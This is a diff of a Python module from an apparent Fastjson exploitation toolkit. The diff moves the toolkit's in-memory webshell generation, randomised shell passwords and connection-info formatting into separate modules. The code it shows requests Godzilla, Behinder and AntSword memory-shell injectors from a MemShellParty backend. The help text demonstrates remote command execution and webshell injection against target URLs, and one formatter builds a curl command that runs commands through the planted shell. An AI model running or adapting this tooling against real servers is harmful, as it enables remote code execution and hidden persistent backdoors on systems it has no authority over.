@@ -12,7 +12,6 @@ import re
 import secrets
 import shutil
 import socket
-import string
 import subprocess
 import sys
 import tempfile
@@ -28,8 +27,16 @@ from typing import Any
 
 from fastjson_toolkit.poc.echo import ECHO_ENGINES as _SHARED_ECHO_ENGINES
 from fastjson_toolkit.poc.echo import build_echo_java_source
-
-_RAND_ALPHABET = string.ascii_letters + string.digits
+from fastjson_toolkit.poc.memshell.auth import (
+    format_memshell_connect_info,
+    rand_token,
+    randomize_memshell_auth,
+)
+from fastjson_toolkit.poc.memshell.client import (
+    DEFAULT_MSHELL_BACKEND as DEFAULT_MSHELL_API,
+    memshell_generate,
+)
+from fastjson_toolkit.poc.memshell.jdk import MSHELL_JDK_MAP, resolve_memshell_jdk
 
 
 class _Ansi:
@@ -215,17 +222,6 @@ MSHELL_TOOLS = (
     "Suo5v2",
     "NeoreGeorg",
 )
-DEFAULT_MSHELL_API = "http://127.0.0.1:8091"
-# 对外 JDK 大版本 -> class 文件版本（MemShellParty targetJreVersion）
-MSHELL_JDK_MAP = {
-    "6": "50",
-    "8": "52",
-    "9": "53",
-    "11": "55",
-    "17": "61",
-    "21": "65",
-}
-
 HELP_EPILOG = r"""
 examples:
   # 出网 + 回显（IPv4 自动转十进制，如 127.0.0.1 -> 2130706433）
@@ -237,7 +233,7 @@ examples:
   # 出网写文件
   fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker -c "id>/tmp/pwn"
 
-  # 出网注入内存马（经 MemShellParty 生成，默认 Undertow/Command/Filter）
+  # 出网注入内存马（内置 memshell-gen.jar，默认 Undertow/Command/Filter）
   fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker --memshell -c id
 
   # 高版本 JDK 目标（自动 byPassJavaModule）
@@ -335,101 +331,6 @@ def _java_string_concat(s: str, chunk: int = 4000) -> str:
         return '""'
     parts = [s[i : i + chunk] for i in range(0, len(s), chunk)]
     return " + ".join(f'"{_java_string_literal(p)}"' for p in parts)
-
-
-def resolve_memshell_jdk(jdk: str) -> tuple[str, str, bool]:
-    """返回 (对外版本, targetJreVersion, byPassJavaModule)。JDK>=9 自动开 module bypass。"""
-    key = (jdk or "8").strip().lower()
-    if key.startswith("java"):
-        key = key[4:]
-    if key.startswith("jdk"):
-        key = key[3:]
-    key = key.strip()
-    if key not in MSHELL_JDK_MAP:
-        raise ValueError(
-            f"不支持的 --ms-jdk={jdk!r}，可选: {', '.join(sorted(MSHELL_JDK_MAP, key=int))}"
-        )
-    class_ver = MSHELL_JDK_MAP[key]
-    bypass = int(key) >= 9
-    return key, class_ver, bypass
-
-
-def memshell_generate(
-    api: str,
-    *,
-    server: str,
-    tool: str,
-    shell_type: str,
-    url_pattern: str,
-    param_name: str,
-    header_name: str,
-    header_value: str,
-    godzilla_pass: str = "pass",
-    godzilla_key: str = "key",
-    behinder_pass: str = "pass",
-    antsword_pass: str = "ant",
-    target_jre: str = "52",
-    shrink: bool = True,
-    by_pass_java_module: bool = False,
-    timeout: float = 30.0,
-) -> dict[str, Any]:
-    """调用 MemShellParty /api/memshell/generate，返回 memShellResult。"""
-    api = api.rstrip("/")
-    shell_tool_config: dict[str, Any] = {
-        "headerName": header_name,
-        "headerValue": header_value,
-        "commandParamName": param_name,
-        "godzillaPass": godzilla_pass,
-        "godzillaKey": godzilla_key,
-        "behinderPass": behinder_pass,
-        "antSwordPass": antsword_pass,
-    }
-    body = {
-        "shellConfig": {
-            "server": server,
-            "serverVersion": "Unknown",
-            "shellTool": tool,
-            "shellType": shell_type,
-            "targetJreVersion": target_jre,
-            "debug": False,
-            "byPassJavaModule": by_pass_java_module,
-            "shrink": shrink,
-            "lambdaSuffix": False,
-            "probe": False,
-        },
-        "shellToolConfig": shell_tool_config,
-        "injectorConfig": {
-            "urlPattern": url_pattern,
-            "staticInitialize": False,
-        },
-        "packer": "Base64",
-    }
-    data = json.dumps(body, separators=(",", ":")).encode("utf-8")
-    req = urllib.request.Request(
-        f"{api}/api/memshell/generate",
-        data=data,
-        headers={"Content-Type": "application/json"},
-        method="POST",
-    )
-    try:
-        with urllib.request.urlopen(req, timeout=timeout) as resp:
-            raw = resp.read().decode("utf-8", errors="replace")
-    except urllib.error.HTTPError as e:
-        err = e.read().decode("utf-8", errors="replace")
-        raise RuntimeError(f"MemShellParty HTTP {e.code}: {err}") from e
-    except Exception as e:
-        raise RuntimeError(f"MemShellParty 不可达 ({api}): {e}") from e
-
-    try:
-        parsed = json.loads(raw)
-    except json.JSONDecodeError as e:
-        raise RuntimeError(f"MemShellParty 返回非 JSON: {raw[:200]!r}") from e
-    if isinstance(parsed, dict) and parsed.get("error"):
-        raise RuntimeError(f"MemShellParty error: {parsed['error']}")
-    result = parsed.get("memShellResult") if isinstance(parsed, dict) else None
-    if not isinstance(result, dict) or not result.get("injectorBytesBase64Str"):
-        raise RuntimeError(f"MemShellParty 响应缺少 injectorBytesBase64Str: {raw[:300]!r}")
-    return result
 
 
 def build_memshell_payload_src(
@@ -1164,12 +1065,12 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
     p.add_argument(
         "--memshell",
         action="store_true",
-        help="注入内存马（调用 MemShellParty 生成 injector）",
+        help="注入内存马（内置 memshell-gen.jar / 可选 MemShellParty HTTP）",
     )
     p.add_argument(
         "--ms-api",
         default=DEFAULT_MSHELL_API,
-        help=f"MemShellParty API (default: {DEFAULT_MSHELL_API})",
+        help="内存马后端：jar（默认，内置生成器）或 http(s)://MemShellParty",
     )
     p.add_argument(
         "--ms-server",
@@ -1271,78 +1172,6 @@ def looks_like_cmd_output(text: str) -> bool:
     # 常见命令输出特征
     markers = ("uid=", "gid=", "groups=", "root", "Windows", "USERDOMAIN", "\n")
     return any(m in t for m in markers) or (len(t) < 400 and " " in t)
-
-
-def rand_token(n: int = 8) -> str:
-    return "".join(secrets.choice(_RAND_ALPHABET) for _ in range(n))
-
-
-def randomize_memshell_auth(tool: str) -> dict[str, str]:
-    """为内存马随机生成密码 / 密钥 / 校验请求头 / Command 参数名。"""
-    auth = {
-        "param_name": rand_token(6),
-        "header_name": f"X-{rand_token(6)}",
-        "header_value": rand_token(12),
-        "godzilla_pass": rand_token(8),
-        "godzilla_key": rand_token(8),
-        "behinder_pass": rand_token(8),
-        "antsword_pass": rand_token(8),
-    }
-    # Command 参数名不宜过长，且避免纯数字
-    if tool == "Command" and auth["param_name"][0].isdigit():
-        auth["param_name"] = "p" + auth["param_name"][1:]
-    return auth
-
-
-def format_memshell_connect_info(memshell: dict[str, Any], target: str = "") -> str:
-    """格式化注入后的连接信息（密码与请求头均已随机）。"""
-    tool = memshell.get("tool") or ""
-    path = memshell.get("url_pattern") or "/*"
-    h_name = memshell.get("header_name") or ""
-    h_value = memshell.get("header_value") or ""
-    connect_url = target.rstrip("/") if target else ""
-    if connect_url:
-        # /* 任意路径；精确路径则拼到 URL
-        if path not in ("/*", "*", ""):
-            p = path.split("*", 1)[0]
-            if not p.startswith("/"):
-                p = "/" + p
-            connect_url = connect_url.rstrip("/") + (p.rstrip("/") or "")
-        else:
-            # 选已有映射，避免根路径 404 干扰排错
-            connect_url = connect_url + "/json"
-
-    lines = [
-        f"tool={tool} type={memshell.get('shell_type')} server={memshell.get('server')}",
-        f"urlPattern={path}",
-    ]
-    if connect_url:
-        lines.append(f"url={connect_url}")
-    # 客户端自定义头请用「Name: value」（冒号）。Name=value 会导致冰蝎对不上头而 404 解密失败
-    lines.append(f"header={h_name}:{h_value}")
-    lines.append(f"headerLine={h_name}: {h_value}")
-    if tool == "Godzilla":
-        lines.append(f"pass={memshell.get('godzilla_pass')}")
-        lines.append(f"key={memshell.get('godzilla_key')}")
-        lines.append("tip=Godzilla 选 JAVA_AES_BASE64；自定义头填 headerLine")
-    elif tool == "Behinder":
-        lines.append(f"pass={memshell.get('behinder_pass')}")
-        lines.append(
-            "tip=冰蝎: 脚本类型jsp / 加密默认; "
-            "URL建议带/json; 自定义请求头必须用「Name: value」不要用 Name=value"
-        )
-    elif tool == "AntSword":
-        lines.append(f"pass={memshell.get('antsword_pass')}")
-        lines.append("tip=自定义头填 headerLine（Name: value）")
-    elif tool == "Command":
-        lines.append(f"param={memshell.get('param_name')}")
-        lines.append(
-            f"tip=curl -H '{h_name}: {h_value}' "
-            f"'{connect_url or '<url>'}?{memshell.get('param_name')}=id'"
-        )
-    lines.append(f"shellClass={memshell.get('shell_class')}")
-    lines.append(f"injector={memshell.get('injector_class')}")
-    return "\n".join(lines)
 
 
 def verify_memshell_injected(
@@ -1611,7 +1440,7 @@ def main(argv: list[str] | None = None) -> int:
             return 2
         try:
             log(
-                f"[*] memshell : api={args.ms_api} "
+                f"[*] memshell : backend={args.ms_api} "
                 f"{hl(args.ms_server)}/{hl(args.ms_tool)}/{hl(args.ms_type)} "
                 f"path={hl(args.ms_path)}"
             )
